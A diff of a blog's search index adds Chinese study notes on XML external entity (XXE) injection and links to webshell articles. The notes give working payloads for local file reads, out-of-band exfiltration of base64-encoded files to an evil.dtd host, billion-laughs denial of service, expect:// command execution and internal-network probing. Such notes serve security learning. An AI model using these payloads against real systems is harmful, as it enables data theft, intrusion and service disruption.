+<h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><h1 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h1><p><a href="https://blog.csdn.net/weixin_39190897/article/details/86772765">(47条消息) Web安全-一句话木马_Tr0e-CSDN博客_一句话木马</a></p>
 <p><a href="https://www.cnblogs.com/moon3/p/12688281.html">php一句话木马变形技巧 - moon3 - 博客园 (cnblogs.com)</a></p>
 <p>exif_imagetype只检查文件头</p>
+<p><strong>小马</strong></p>
+<p><a href="https://www.jianshu.com/p/90473b8e6667">PHP一句话木马之小马 - 简书 (jianshu.com)</a></p>
+<p>JSP<strong>一句话木马</strong></p>
+<p><a href="https://www.jianshu.com/p/123db17b78a0">JSP一句话木马 - 简书 (jianshu.com)</a></p>
 ]]></content>
       <categories>
         <category>文件上传漏洞</category>
@@ -1727,6 +1829,76 @@
       </categories>
       <tags>
         <tag>DDOS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xxe</title>
+    <url>/2022/04/21/xxe/</url>
+    <content><![CDATA[<h1 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h1><p>xml External Entity attack </p>
+<p>xml 外部实体注入</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>由于程序在解析xml的时候，解析了攻击者伪造的外部实体而产生的</p>
+<h1 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h1><p><strong>直接通过DTD外部实体声明</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">       &lt;!DOCTYPE ANY [</span><br><span class="line">               &lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">       ]&gt;</span><br><span class="line">       &lt;abc&gt;&amp;test;&lt;/abc&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>通过DTD文档引入外部DTD文档，再引入外部实体声明</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">        &lt;!DOCTYPE a SYSTEM &quot;http://localhost/evil.dtd&quot;&gt;</span><br><span class="line">        &lt;abc&gt;&amp;b;&lt;/abc&gt;</span><br></pre></td></tr></table></figure>
+
+<p>evil.dtd内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过DTD<strong>外部实体声明引入外部实体声明</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">       &lt;!DOCTYPE a [</span><br><span class="line">               &lt;!ENTITY % d SYSTEM &quot;http://localhost/evil.dtd&quot;&gt;</span><br><span class="line">       %d;</span><br><span class="line">       ]&gt;</span><br><span class="line">       &lt;abc&gt;&amp;b;&lt;/abc&gt;</span><br></pre></td></tr></table></figure>
+
+<p>evil.dtd内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h1><p>第一种</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">       &lt;!DOCTYPE a [</span><br><span class="line">       &lt;!ENTITY % file SYSTEM &quot;file:///c://test/1.txt&quot;&gt;</span><br><span class="line">       &lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt; </span><br><span class="line">       %dtd; %all; </span><br><span class="line">       ]&gt; </span><br><span class="line">       &lt;abc&gt;&amp;send;&lt;/abc&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其中evil.xml文件内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>第二种</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">     &lt;!DOCTYPE a [</span><br><span class="line">     &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=c:/test/1.txt&quot;&gt;</span><br><span class="line">     &lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;</span><br><span class="line">     %dtd;</span><br><span class="line">     %send;</span><br><span class="line">     ]&gt;</span><br><span class="line">     &lt;abc&gt;&lt;/abc&gt;</span><br></pre></td></tr></table></figure>
+
+<p>evil.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &#x27;http://localhost/?content=%file;&#x27;&gt;&quot;&gt; %payload;</span><br></pre></td></tr></table></figure>
+
+<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><h2 id="1-读取任意文件"><a href="#1-读取任意文件" class="headerlink" title="1.读取任意文件"></a>1.读取任意文件</h2><p>有回显</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">   &lt;!DOCTYPE ANY [</span><br><span class="line">   &lt;!ENTITY test SYSTEM &quot;file:///E://phpStudy/PHPTutorial/WWW/etc/passwd.txt&quot;&gt;</span><br><span class="line">   ]&gt;</span><br><span class="line">   &lt;abc&gt;&amp;test;&lt;/abc&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>无回显</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">  &lt;!DOCTYPE a [</span><br><span class="line">  &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=E://phpStudy/PHPTutorial/WWW/etc/passwd.txt&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;</span><br><span class="line">  %dtd;</span><br><span class="line">  %send;</span><br><span class="line">  ]&gt;</span><br><span class="line">  &lt;abc&gt;&lt;/abc&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &#x27;http://localhost/?content=%file;&#x27;&gt;&quot;&gt; %payload;</span><br></pre></td></tr></table></figure>
+
+<h2 id="危害2-拒绝服务攻击"><a href="#危害2-拒绝服务攻击" class="headerlink" title="危害2.拒绝服务攻击"></a>危害2.拒绝服务攻击</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">   &lt;!DOCTYPE lolz [</span><br><span class="line">   &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">   &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">   &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">   &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">   &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">   &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">   &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">   &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">   &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">   ]&gt;</span><br><span class="line">   &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="危害3-远程命令-代码-执行"><a href="#危害3-远程命令-代码-执行" class="headerlink" title="危害3.远程命令(代码)执行"></a>危害3.远程命令(代码)执行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">  &lt;!DOCTYPE ANY [</span><br><span class="line">  &lt;!ENTITY test SYSTEM &quot;expect://id&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">  &lt;abc&gt;&amp;test;&lt;/abc&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此示例是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能有此漏洞。</p>
+<h2 id="危害4-内网信息探测"><a href="#危害4-内网信息探测" class="headerlink" title="危害4.内网信息探测"></a>危害4.内网信息探测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">  &lt;!DOCTYPE ANY [</span><br><span class="line">  &lt;!ENTITY test SYSTEM &quot;http://127.0.0.1:87/tets.txt&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">  &lt;abc&gt;&amp;test;&lt;/abc&gt;</span><br></pre></td></tr></table></figure>
+
+<p>无回显</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=http://127.0.0.1:81/&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">    %send;</span><br><span class="line">    ]&gt;</span><br><span class="line">    &lt;abc&gt;&lt;/abc&gt;</span><br></pre></td></tr></table></figure>
+
+<p>evil.xml内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &#x27;http://localhost/?content=%file;&#x27;&gt;&quot;&gt; %payload;</span><br></pre></td></tr></table></figure>
+
+<h2 id="危害5-攻击内网网站"><a href="#危害5-攻击内网网站" class="headerlink" title="危害5.攻击内网网站"></a>危害5.攻击内网网站</h2><p><a href="https://www.freebuf.com/column/181064.html">XXE(XML External Entity attack)XML外部实体注入攻击 - FreeBuf网络安全行业门户</a></p>
+<p><a href="https://www.cnblogs.com/backlion/p/9302528.html">XML外部实体（XXE）注入详解 - 渗透测试中心 - 博客园 (cnblogs.com)</a></p>
+]]></content>
+      <categories>
+        <category>xxe</category>
+      </categories>
+      <tags>
+        <tag>xxe</tag>
       </tags>
   </entry>
 </search>
